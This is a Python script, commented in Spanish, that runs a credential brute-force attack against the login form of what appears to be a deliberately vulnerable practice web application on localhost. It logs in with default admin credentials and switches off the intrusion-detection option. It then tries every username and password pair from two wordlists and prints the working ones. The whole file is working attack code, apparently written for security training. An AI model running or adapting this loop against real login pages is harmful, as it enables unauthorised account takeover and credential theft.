import requests
from bs4 import BeautifulSoup

def inicializar_sesion():
    session = requests.Session()
    login_url = "http://localhost:8081/login.php"
    response = session.get(login_url)
    soup = BeautifulSoup(response.text, 'html.parser')
    user_token = soup.find('input', {'name': 'user_token'})['value']
    data = {
        "username": "admin",
        "password": "password",
        "user_token": user_token,
        "Login": "Login"
    }
    session.post(login_url, data=data)
    session.get("http://localhost:8081/security.php?phpids=off")  # Desactivar PHPIDS
    return session

def intentar_login(session, usuario, contraseña):
    url = f"http://localhost:8081/vulnerabilities/brute/"
    params = {"username": usuario, "password": contraseña, "Login": "Login"}
    headers = {
        "User-Agent": "Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0",
        "Referer": "http://localhost:8081/vulnerabilities/brute/"
    }
    respuesta = session.get(url, params=params, headers=headers)
    print(f"Probando: {usuario}:{contraseña}")
    print(f"Código de estado: {respuesta.status_code}")
    print(f"URL final: {respuesta.url}")
    
    if "Welcome to the password protected area" in respuesta.text:
        print("Inicio de sesión exitoso!")
        return True
    elif "Username and/or password incorrect" in respuesta.text:
        print("Credenciales incorrectas")
    else:
        print("Respuesta inesperada")
        print(respuesta.text[:500])  # Imprimir los primeros 500 caracteres de la respuesta
    return False

def ataque_fuerza_bruta():
    session = inicializar_sesion()
    credenciales_validas = []

    with open("user.txt") as u, open("contra.txt") as p:
        usuarios = u.read().splitlines()
        contraseñas = p.read().splitlines()

    for usuario in usuarios:
        for contraseña in contraseñas:
            if intentar_login(session, usuario, contraseña):
                credenciales_validas.append(f"{usuario}:{contraseña}")

    if credenciales_validas:
        print("\nCredenciales válidas encontradas:")
        for credencial in credenciales_validas:
            print(credencial)
    else:
        print("No se encontraron credenciales válidas.")

if __name__ == "__main__":
    ataque_fuerza_bruta()